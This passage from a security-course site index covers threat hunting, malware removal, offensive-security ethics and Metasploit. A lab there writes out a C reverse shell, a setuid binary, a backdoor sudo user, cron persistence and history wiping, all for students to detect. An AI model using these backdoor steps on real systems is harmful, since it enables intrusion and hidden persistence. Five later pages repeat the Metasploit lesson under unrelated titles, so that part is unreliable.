It is also very possible to insert malicious hardware into a turned-on computer so.. turn them off when you leave the room, but really, if you're worried, bring them with you. Electronic Emissions It is possible for you to be surveilled by a local team based on your computer's hardware emanations? Yes! Is it likely? No! Is it cool! Yes!!!! Read this: https://en.wikipedia.org/wiki/Van_Eck_phreaking Truecrypt Conspiracy Theory Hey we are deep into threat modeling right now, read up on the TrueCrypt Conspiracy Theory. Who knows honestly, but it is interesting. If someone has you and the computer, you are screwed. But more importantly, they had already found you, so you were already screwed. Is there an answer to any of this? Not really, just risk model and move on. Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"DefenseAgainsttheDarkArts/0-HowtoTellifYouareHacked.html":{"url":"DefenseAgainsttheDarkArts/0-HowtoTellifYouareHacked.html","title":"How to Tell if You are Hacked","keywords":"","body":"How to Tell if You are Hacked As we went over earlier, if a sufficiently advanced attacker wants to get into your stuff specifically, they will. But we have looked at our threat model before and have determined we are probably not a person of interest to the FSB, right? Right??? So according to our threat model, the most likely people to hack us will be random criminals who don't care who we are, they're just trying to get in. While it is an oversimplification, \"An ounce of prevention is worth a pound of cure\". If you are able to harden yourself ahead of time and not be an easy target, you will be much less likely to get hit with a non-targeted attack, and in the possibility that you ever are targeted, you will be more likely to not get caught off guard. These are some of the most common reasons you might get hacked. You are already hacked!! The most common way to get malware on your computer is to already have malware on your computer. Seriously, when I was first writing this section, I ran a scan on the shared family computer I was using and removed five separate PUPs and one piece of adware. Shared computers, whether family, work, or libraries, are hot places for malware to be sitting on, and if you log in to a owned computer, you might just lose your passwords to a keylogger. So let's make sure you are not owned already and then set ourselves up to be safe in the future. How Can You Tell Remember the term indicators of compromise (IOC) from before?. There are a ton that can be used, some approaches more technical than others. Common non-technical indicators include constant pop ups, home page redirection, search engine redirection, the classic pile of toolbars, and the computer being slow and the fans working way too hard. Technical indicators include extra processes running, network requests, and things saved in places they shouldn't be. Looking for these technical indicators is called \"Threat Hunting\". It deserves its own section, but we will briefly go over a few ways you can identify the bad things on your computer. MalwareBytes: How To Tell If You're Infected Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"DefenseAgainsttheDarkArts/1-AntiVirusBasics.html":{"url":"DefenseAgainsttheDarkArts/1-AntiVirusBasics.html","title":"AntiVirus Basics","keywords":"","body":"Anti-Virus Basics This section will bring me some heat, because a lot of people in the security community don't believe that anti-virus is helpful. I disagree, mostly on the basis that while they only detect lowest hanging fruit malware, I don't want to be a lowest hanging fruit victim. Basically, these companies execute the malware, break down the malware into tiny pieces and creates indicators for the different components and what the execution of them look like, so that they can identify them on your computer and completely delete them off. I recommend that you have Windows Defender running at all times for protection. There is no need to have any other anti-virus on your computer, more is not better. As an important note, Linux anti-virus is pretty horrible and you should never install it. It's pretty difficult to get a virus on Linux, but if you do, let me know so I can RE it. The only time I'd recommend you run a second antivirus is to remove an active adware or PUP infection as Windows Defender doesn't consider many of them malicious. (If you want to correct me on this, just hit me via any of my many contact methods.) Task: Read this: https://www.computerhope.com/issues/ch001738.htm Download Malwarebytes and run it. https://www.malwarebytes.com/mwb-download/ Install Windows Defender, because it is built into your computer and really, really good. If it is installed, make sure it is running. Uninstall Malwarebytes. You don't need it around all the time, just download an run it whenever you get on a new computer and then once every couple months just to make sure. Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"DefenseAgainsttheDarkArts/2-ThreatHuntingBasics.html":{"url":"DefenseAgainsttheDarkArts/2-ThreatHuntingBasics.html","title":"Threat Hunting Basics","keywords":"","body":"Threat Hunting Basics Sometimes we don't want to sit around and wait to get an alert from our anti-virus or worse, a phone call saying we've been ransomwared and the bad guys have been on our network for weeks. To avoid this, there is a proactive approach known as \"threat hunting\" where the defenders go out into their own network, look through logs, and try to find evil. As this is their network, they can do a lot of things to increase visibility, as well as force attackers to be loud and do distinctly attacker-ish actions. Perhaps most importantly, defenders have home team advantage and can check for changes and new happenings across their logs, which might alert them to bad things that are going on. Because they \"know normal\", it's easier for them to \"find evil\". People always say you should hunt with a threat in mind rather than \"boiling the ocean\", but both approaches have their benefits. We'll check them out as we go. Read this: https://www.crowdstrike.com/cybersecurity-101/threat-hunting/ Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"DefenseAgainsttheDarkArts/3-LinuxNetworkHuntingLab.html":{"url":"DefenseAgainsttheDarkArts/3-LinuxNetworkHuntingLab.html","title":"Linux Network Hunting Lab","keywords":"","body":"Linux Network Hunting Lab In order for us to do a local hunt for a malicious Linux process, we have to make ourselves a malicious process. Create Evil First let's pretend we are a bad guy who just got access to a box and are taking our first persistence steps. $ adduser backdooruser (and create new user) $ usermod -aG sudo backdooruser $ su - backdooruser Next place the following code for a reverse shell into a file named mal.c and save it in your /bin directory: #include #include #include #include #include #include #include int main(void){ int port = 1337; struct sockaddr_in revsockaddr; int sockt = socket(AF_INET, SOCK_STREAM, 0); revsockaddr.sin_family = AF_INET; revsockaddr.sin_port = htons(port); revsockaddr.sin_addr.s_addr = inet_addr(\"127.0.0.1\"); connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr)); dup2(sockt, 0); dup2(sockt, 1); dup2(sockt, 2); char * const argv[] = {\"/bin/sh\", NULL}; execve(\"/bin/sh\", argv, NULL); return 0; } Then run the following commands: $ gcc mal.c -o /bin/mal $ rm mal.c $ sudo chmod u+s /bin/mal $ sudo crontab -e Add line to cron file and save to set up the cron job: */5 * * * * /bin/mal Once you have that done step out of the su back to your normal user and run $ nc -lp 1337 and in another window run $ /bin/mal. You should have a root shell connect back. Confirm that this works before moving forward. Now let's clear out our command history with cat /dev/null > ~/.bash_history, because we are sneaky little backdoor hiders. Kill the connection and start listening again. Network Hunting We can use network traffic to identify evil, in fact, it just might be the easiest way to initially detect something without having to go look for it. If malware is on your network, it is going to try to talk out to its command and control server. There are plenty of ways to look at network traffic, especially if you are a larger organization that has a security monitoring setup like SecurityOnion. Hunting Packet Captures This is the more common form of network hunting. Rather than being on the potentially compromised box itself, we can just look at the packets captured and search through it to find evil. This is the bread and butter of most organization's defensive posture. Set up Wireshark and begin capturing on the localhost interface (this is essential because your reverse shell is heading to 127.0.0.1 and will not wind up leaving the main interface. Wait for your reverse shell to connect and then use the nc listener to run a few commands. Use ‘wget https://st2.depositphotos.com/1000393/6507/i/950/depositphotos_65076917-stock-photo-hacker-and-terrorism-fight.jpg’ as one of your commands. Use the Wireshark capture you generated to find the malicious process and data that was passed back and forth. Local Network Hunting Locally, it should be easy to identify both your listening and connected processes using the following commands. They all do something slightly different but are very useful. netstat -antp netstat -la | grep “LISTEN” “ESTABLISHED” lsof -u lsof -i In the real world, we could set up a log monitoring system that would check these sort of things on a regular basis but that is overkill for a single host. Everyday Hunting For everyday use on a Linux box I recommend the tool ntopng and Wireshark for this purpose. ntop identifies processes making network connections and alerts on them. If the process doesn't make sense when it pops up, go to Wireshark and open up the stream to see if it makes sense. Assignment: Make sure you understand what the attacker did and why. Try to understand what the effect was of each command the attacker ran. This is some pretty complicated stuff. Write up a minimal report on the malicious actions taken by the attacker as well as information about the backdoor, according to the packet capture and the networking commands used. Include information from the command outputs' and Wireshark to provide detail. Do not go any further than this lab's content in your writeup. Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"DefenseAgainsttheDarkArts/4-LinuxProcessHunting.html":{"url":"DefenseAgainsttheDarkArts/4-LinuxProcessHunting.html","title":"Linux Process Hunting","keywords":"","body":"Linux Process Hunting Now that we have detected there is a malicious process running on one of our hosts, let's hop onto the box and start looking through the processes. Detecting Evil Let's start looking at all the ways we can detect this and find out more information, without having to use any networking commands. In this scenario, let's say our network analysts reported that weird traffic makes them believe the system has been compromised in the last week. Running the \"history\" command and seeing what pops up is a solid first move once you get on any box. However, because the attacker cleared out their history, we shouldn't see anything there, which should be an alert to us itself! Using the find command we can check for files made in the last week with * find / -mtime -o -ctime -7. To get even more specific, like if we thought we were recently compromised, we can make that 7 a 1. You should see a new file or two. Check the user of that file with ls -l. If that user seems suspicious, let's check out their most recent commands run. su over to the new user you discovered and check their history, maybe the attacker forgot to hide that as well. Now that we know there is definitely a new user added and what looks like crontabs, let's start by looking for common persistence mechanisms from the command line. First, we can check cronjobs using the crontab command, or crontab -u to check other users. We can also look for SETUID or SETGID binaries with find / -perm -4000 -user root -type f and find / -perm -6000 -type f. Modify those commands as you see fit. Another great tool to use is going through the logs stored in /var/log. In the real world, many organizations collect all of these logs from their computers and store them in a centralized location where analysts can look through them to find evil, or after evil is detected, determine what else was done. With that said, just because an organization is collecting does not mean they are detecting, just like with packet captures. There are a ton of different logs in there, but the most useful is named \"syslog\". You can look through that and find information about what has happened, especially if you search through it to find where the attacker began running commands. Now that we've discovered that there is definitely malware on the box, in the real world an analyst would log onto the potentially compromised host and begin doing incident response. For us though, let's wrap this up. For other commands useful to look for malicious processes check out this cheatsheet Linux Rootkit Hunting To go one step further, if you fear that you might have a rootkit, installing and running the rkhunter or chrootkit tools is an excellent idea. These tools attempt to look for signatures of known rootkits or discrepancies in the output of commands which might indicate the presence of something modifying the operating system.... with that said, many rootkits have specific anti-detection defenses built-in, so it is a cat and mouse game. Assignment: Write up a minimal report on the malicious actions taken by the attacker, as well as information about the backdoor. Include information from the command outputs to provide detail. Congratulations on your first successful hunt! If you are looking to create a nice addition to your professional portfolio, I recommend combining your last two assignments, making it look pretty, and posting it somewhere. People will be very interested in it. Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"DefenseAgainsttheDarkArts/5-WindowsNetworkThreatHunting.html":{"url":"DefenseAgainsttheDarkArts/5-WindowsNetworkThreatHunting.html","title":"Windows Network Threat Hunting","keywords":"","body":"Windows Network Threat Hunting Network hunting on Windows is basically the same thing as on Linux, it's all just packets. Packet captures from all operating systems will be saved in the same place on the security monitoring server and network analysts will look at them using the same tools. Even looking at Wireshark captures locally will be basically the same, though there will be a bunch of weird looking Microsoft protocols going on that all look like malware C2 but really are benign. \"Know normal, find evil\", so get used to the weirdness. The primary difference for you will be what tools you use to look for rouge local connections. I recommend the built-in commands netstat –ano and netstat –af for that on Windows. Even better, an awesome Windows program named Glasswire identifies processes making network connections and alerts on them. If the process doesn't make sense when it pops up, go to Wireshark and open up the stream. Basically a self-sufficient threat hunter now. Glasswire Directed Hunt Download Glasswire for Windows https://www.glasswire.com/ You already should have Wireshark downloaded. If not, download it. Look at the Glasswire alerts. Choose one of the alerts for something that isn't a web browser and identify the stream in Wireshark. Submit a description of what data was being sent and to whom based on your analysis. Undirected Hunt Let's go boil that ocean! Ensure all web browsers are closed Open Wireshark and begin capturing traffic After 30 minutes, work through packet capture, looking at what has the highest packet counts in \"Statistics\" Trace the streams and identify what was going on. Submit a brief explanation of what the top source of network traffic was during this time. Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"DefenseAgainsttheDarkArts/6-WindowsProcessHunting.html":{"url":"DefenseAgainsttheDarkArts/6-WindowsProcessHunting.html","title":"Windows Process Hunting","keywords":"","body":"Windows Process Hunting Windows Process Hunting is just like on Linux, but requires a better understanding of the Windows OS. Because Windows is a nightmare, knowing what is normal in order to find out what is evil is a much more difficult task. On the plus side, because there is so much more Windows malware, the security community has put a great deal more effort into creating resources on how to do this, as well as programs that will do it for you. I am not going to get into Windows Process Hunting at this time, but here are some interesting resources if you want to learn more: SANS Windows Hunt Poster Hunting with Sysinternals Hunting with Event Logs Hunting with Defender Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"DefenseAgainsttheDarkArts/7-MalwareRemoval.html":{"url":"DefenseAgainsttheDarkArts/7-MalwareRemoval.html","title":"Malware Removal","keywords":"","body":"Malware Removal We are about to get philosophical. Remember how we were just talking about how there is straight up, NO possible way for us to know if your computer is owned? Well we are about to get into the exact same problem, but now for cleaning your computer. If you have evidence that a malicious program ran on your computer, you can never trust this computer ever again. That tiny PUP that kept changing your homepage to some Chinese marketplace could have been bundled with some nation state rootkit that overwrote your computer's foundational code down at the soul of the device and you aren't going to be able to remove that malware unless you return the silicon into sand. However, that is very, very, very unlikely. As we have said before, you are not going to be targeted by nation states, or really anyone at all. If you get hacked, almost certainly by an untargeted attack, the malware will drop itself off, establish persistence, and then do its thing. While there have been examples in the past of standard malware going for rootkit persistence, that is significantly more difficult on modern operating systems. 99% of the time, if antivirus identifies the malware and removes it, you are good and don't have to worry about any follow on problems. Sure, that does leave room for the next 1%, so my recommendation is remove the malware, let that computer chill for a day or two if you can afford to use another, and then run the malware scan again. If you keep finding malware you have a bigger problem, but the rest of the time, you can just go back to using the computer as normal. It is no life to buy a new computer every time you mess up, and it gets expensive fast. So with all that said, if you use your computer for nuclear launch codes, critical intellectual property, or managing the crypto wallets of your hoarded wealth in addition to casual internet surfing, don't destroy the pwned computer. Buy a new computer to do your serious business, and then clean up the old one as best you can and use the old computer to surf the web. Compartmentalization is key. So how do I get it clean again? Can't do better than this guide. a href=\"https://blog.malwarebytes.com/101/2015/06/10-easy-steps-to-clean-your-infected-computer/\" rel=\"noopener\" target=\"_blank\"https://blog.malwarebytes.com/101/2015/06/10-easy-steps-to-clean-your-infected-computer/ I might get some heat from some corners for recommending a specific malware remover, but hell, its Malwarebytes or Kaspersky and I'm not big on Russians. Also, go to a clean computer and change all of your passwords immediately. Allllll of them. Remember, prior to resetting passwords, ensure that you have ended all the sessions your account is showing. If you reset passwords but sessions are still active, the attacker can still have access to your accounts. What would happen if the malware doesn't all get deleted on the first run? If all the malware is still there, it means that the anti-virus you're using isn't very good, or that the malware is pretty good. Maybe both. Either way, you are not good enough to go and manually delete everything you need to delete the malware yourself, so best bet is don't use the computer for a few days, then try and delete it again using your tools after their signatures get updated. Think about it this way, if a piece of malware gets by your anti-virus' signatures, there is a good chance that it is somewhat new. If you got hacked by it in an untargeted attack, most likely many other people did as well. This will lead to the anti-virus company identifying the malware as persistent and then analyzing it to identify what it is missing in the first clean. Then they will update the signatures and have a more effective removal process the next time. If the malware's persistence mechanism is so good you, Windows, and Malwarebytes still can't beat it, your best move is to reinstall the operating system. This will work in most cases, though there is a small chance of a rootkit/bookit or worse, firmware malware persisting across OS installs. If this happens... well honestly, you probably won't notice. But if you do think you have a bootkit... you don't, you're not that special. Let's say you are actually someone important and you think you have a real bootkit (of which like 3 have ever been found in the wild). Get your computer to someone who can get it to Citizen Lab(a non profit group that does detection and response for journalists and dissidents) because that's some high quality shit. They'll probably give you a sticker or something. Repeat Attack Vectors If you removed the malware, but you keep getting new malware a week or two later, and you are confident it isn't persistent, you need to figure out how you keep getting hit. Patching If you haven't patched, you are still vulnerable! You should have auto update on. Attachments If you, or someone else keeps getting hit with attachments/etc, they need some user training Pirated Software If you keep downloading pirated shit, you will keep getting popped. That is just how it goes. Porn Popups Same shit, stop going on sketchy porn sites and downloading things. It could be persistent and just sleeps for a week upon install Reinstall your OS Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"TheDarkArts/0-AttackerMindset.html":{"url":"TheDarkArts/0-AttackerMindset.html","title":"Attacker Mindset","keywords":"","body":"Attacker Mindset I've spend a lot of time trying to help you get into the defender mindset and understand risk so far, but it's time to get into the attacker mindset. Red teaming is super easy to teach, and to do, compared to playing defense. So I've decided to start by teaching some extremely basic things to get your brain thinking about this from all angles. We are going to lean on some fantastic training from TryHackMe to move through these next steps. I will mostly just send you to their site to do their activities, but I will add my own context and a bit more discussion here. I really want to drive home, this is the part where you could start getting into trouble if you start using the skills you learn here against people in the real world. If you scan your school network or try to run these tools against people you know, you could very possibly be breaking the law and there could really be serious legal consequences. To start, make an account on TryHackMe if you haven't already and complete their Intro to Offensive Security Room. Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"TheDarkArts/1-ResponsibleOffensiveSecurity.html":{"url":"TheDarkArts/1-ResponsibleOffensiveSecurity.html","title":"Responsible Offensive Security","keywords":"","body":"Responsible Offensive Security I cannot be too serious about how important it is that you only use the knowledge you gain in your security journey in ways that are 100% legal. It is extremely critical to remember that legal and well-intentioned are not the same thing. Just because you are doing something to help out a friend, to secure someone's site, or just because you think it is a funny prank, does not make what you are doing okay. In the US it is very likely your good intentions or jokes are illegal under the Computer Fraud and Abuse Act or CFAA, and those activities could have a significant impact on you if you are ever caught in the act or compelled to tell the truth about your misuse of computer systems on job applications. It's a significant problem for people who are just starting out, you have all this knowledge and the world is full of broken systems that you can do interesting things with. If you are too immature, you can really get yourself into dangerous territory very quickly. Assignment: Submit the following: \"I pledge to never use offensive security knowledge against systems I am not allowed to target under legal authorities. I will practice my offensive security knowledge against infrastructure explicitly designed for learning.\" If you don't want to submit that, don't go any further on this site. Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"TheDarkArts/2-ReconandEnumeration.html":{"url":"TheDarkArts/2-ReconandEnumeration.html","title":"Recon and Enumeration","keywords":"","body":"Recon and Enumeration 99% of hacking is recon and enumeration, knowing the network. As an attacker, you are looking for misconfiguration, weak services, anything that can give you and edge. As a defender, you need to know what is on your network, what is visible to the network, and if there are any weaknesses that you should go and fix. Whoever knows the network best, wins. Do these lessons from TryHackMe. Nmap Live Host Discovery - Learn how to use Nmap to discover live hosts using ARP scan, ICMP scan, and TCP/UDP ping scan Vulnversity - Learn about active recon, web app attacks and privilege escalation Assignment: To practice your enumeration skills, you have my permission to conduct an external recon of the IPs, ports, and services related to hoppersroppers.org using the tools you just learned. Submit your findings, as boring as they might be. Don't spend too much time on this, and please don't try to hack the site, I promise there is nothing interesting and this is not a hacking challenge. You might be thinking to yourself, well I should try scanning my school's network, or some other website... Don't do it. While it is legal, there is a very serious chance you wind up getting talked to extremely sternly or worse if you put packets on the wire and people have to go investigate what is going on. This knowledge should only be used against training machines or websites you have explicit permission to enumerate. Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"TheDarkArts/3-BabySteps.html":{"url":"TheDarkArts/3-BabySteps.html","title":"Baby Steps","keywords":"","body":"Baby Steps These next few challenges will work you all the way through the killchain. Blue - Deploy & hack into a Windows machine, leveraging common misconfigurations issues Simple CTF - A beginner-friendly Capture the Flag Bounty Hacker - Prove that you’re the most elite hacker in the solar system, and claim your right to the status of Elite Bounty Hacker! For the assignment, submit a short writeup on one of the challenges detailing what you did and what a defender could have done to stop you. Again, remember that this knowledge is only to be used in CTFs and against training machines, never in the real world. Do not go trying these techniques against other people's websites or computers. Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"TheDarkArts/4-LinuxPrivesc.html":{"url":"TheDarkArts/4-LinuxPrivesc.html","title":"Linux Privesc","keywords":"","body":"Linux Privesc Spend some time learning about how to get to root from a normal user level on Linux! Linux Privilege Escalation - Get hands-on with over 8 different privilege escalation techniques Linux PrivEsc Arena - Learn how to escalate privileges using a very vulnerable Linux VM For your assignment, describe the privesc method you thought would be the hardest to detect and the easiest to detect for defenders, and why. Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"TheDarkArts/5-WindowsPrivesc.html":{"url":"TheDarkArts/5-WindowsPrivesc.html","title":"Windows Privesc","keywords":"","body":"Windows Privesc Now it's time to learn a little bit more about Windows privileges! Windows PrivEsc - Practice your Windows Privilege Escalation skills on an intentionally misconfigured Windows VM Windows Privesc Arena - Learn how to escalate privileges using a very vulnerable Windows 7 VM For your assignment, describe the differences between Linux permissions and Windows permissions, and be sure to include a description of how 'root' is different. Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"TheDarkArts/6-BabyMetasploit.html":{"url":"TheDarkArts/6-BabyMetasploit.html","title":"Baby Metasploit","keywords":"","body":"Baby Metasploit Weaponization/Delivery/Exploitation Quick refresh on the steps of the killchain: Weaponization: Once we find out what kind of vulnerabilities or protocols are running on the system we can find N-Days that we can weaponize or do vulnerability research ourselves to find 0-Days. Delivery: This is where we decide how we will delivery our weaponized payload that will gain us access. This can be over the wire, through social engineering, or going somewhere and plugging in a USB. Exploitation: This is where the actual code of our payload will execute allowing us to gain access to a system. Everything done after the initial execution of our code is considered post-exploitation. To demonstrate these three steps we will be using an exploitation framework known as Metasploit. We can use Metasploit to pick N-Days, choose a delivery message, and use different exploitation modules to execute code. Complete: https://tryhackme.com/room/metasploitintro There is no assignment for this lesson. Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"SecuringYourself/0-DontGetHacked.html":{"url":"SecuringYourself/0-DontGetHacked.html","title":"Dont Get Hacked","keywords":"","body":"Don't Get Hacked Weaponization/Delivery/Exploitation Quick refresh on the steps of the killchain: Weaponization: Once we find out what kind of vulnerabilities or protocols are running on the system we can find N-Days that we can weaponize or do vulnerability research ourselves to find 0-Days. Delivery: This is where we decide how we will delivery our weaponized payload that will gain us access. This can be over the wire, through social engineering, or going somewhere and plugging in a USB. Exploitation: This is where the actual code of our payload will execute allowing us to gain access to a system. Everything done after the initial execution of our code is considered post-exploitation. To demonstrate these three steps we will be using an exploitation framework known as Metasploit. We can use Metasploit to pick N-Days, choose a delivery message, and use different exploitation modules to execute code. Complete: https://tryhackme.com/room/metasploitintro There is no assignment for this lesson. Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"SecuringYourself/1-SecuringWindowsAccordingtoTaylorSwift.html":{"url":"SecuringYourself/1-SecuringWindowsAccordingtoTaylorSwift.html","title":"Securing Windows According to Taylor Swift","keywords":"","body":"Securing Windows, According to Taylor Swift Weaponization/Delivery/Exploitation Quick refresh on the steps of the killchain: Weaponization: Once we find out what kind of vulnerabilities or protocols are running on the system we can find N-Days that we can weaponize or do vulnerability research ourselves to find 0-Days. Delivery: This is where we decide how we will delivery our weaponized payload that will gain us access. This can be over the wire, through social engineering, or going somewhere and plugging in a USB. Exploitation: This is where the actual code of our payload will execute allowing us to gain access to a system. Everything done after the initial execution of our code is considered post-exploitation. To demonstrate these three steps we will be using an exploitation framework known as Metasploit. We can use Metasploit to pick N-Days, choose a delivery message, and use different exploitation modules to execute code. Complete: https://tryhackme.com/room/metasploitintro There is no assignment for this lesson. Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"SecuringYourself/2-SecuringLinuxAccordingtoDennis.html":{"url":"SecuringYourself/2-SecuringLinuxAccordingtoDennis.html","title":"Securing Linux According to Dennis","keywords":"","body":"Securing Linux, According to Dennis Weaponization/Delivery/Exploitation Quick refresh on the steps of the killchain: Weaponization: Once we find out what kind of vulnerabilities or protocols are running on the system we can find N-Days that we can weaponize or do vulnerability research ourselves to find 0-Days. Delivery: This is where we decide how we will delivery our weaponized payload that will gain us access. This can be over the wire, through social engineering, or going somewhere and plugging in a USB. Exploitation: This is where the actual code of our payload will execute allowing us to gain access to a system. Everything done after the initial execution of our code is considered post-exploitation. To demonstrate these three steps we will be using an exploitation framework known as Metasploit. We can use Metasploit to pick N-Days, choose a delivery message, and use different exploitation modules to execute code. Complete: https://tryhackme.com/room/metasploitintro There is no assignment for this lesson. Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"SecuringYourself/3-SupplyChainAttacks.html":{"url":"SecuringYourself/3-SupplyChainAttacks.html","title":"Supply Chain Attacks","keywords":"","body":"Supply Chain Attacks Weaponization/Delivery/Exploitation Quick refresh on the steps of the killchain: Weaponization: Once we find out what kind of vulnerabilities or protocols are running on the system we can find N-Days that we can weaponize or do vulnerability research ourselves to find 0-Days. Delivery: This is where we decide how we will delivery our weaponized payload that will gain us access. This can be over the wire, through social engineering, or going somewhere and plugging in a USB. Exploitation: This is where the actual code of our payload will execute allowing us to gain access to a system. Everything done after the initial execution of our code is considered post-exploitation. To demonstrate these three steps we will be using an exploitation framework known as Metasploit. We can use Metasploit to pick N-Days, choose a delivery message, and use different exploitation modules to execute code. Complete: https://tryhackme.com/room/metasploitintro There is no assignment for this lesson. Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "},"SecuringYourself/4-HowtoHelpOthersBeSafeOnline.html":{"url":"SecuringYourself/4-HowtoHelpOthersBeSafeOnline.html","title":"How to Help Others Be Safe Online","keywords":"","body":"How to Help Others Be Safe Online Weaponization/Delivery/Exploitation Quick refresh on the steps of the killchain: Weaponization: Once we find out what kind of vulnerabilities or protocols are running on the system we can find N-Days that we can weaponize or do vulnerability research ourselves to find 0-Days. Delivery: This is where we decide how we will delivery our weaponized payload that will gain us access. This can be over the wire, through social engineering, or going somewhere and plugging in a USB. Exploitation: This is where the actual code of our payload will execute allowing us to gain access to a system. Everything done after the initial execution of our code is considered post-exploitation. To demonstrate these three steps we will be using an exploitation framework known as Metasploit. We can use Metasploit to pick N-Days, choose a delivery message, and use different exploitation modules to execute code. Complete: https://tryhackme.com/room/metasploitintro There is no assignment for this lesson. Hoppers Roppers 2024            Date： 2024-02-25 22:04:50 "}}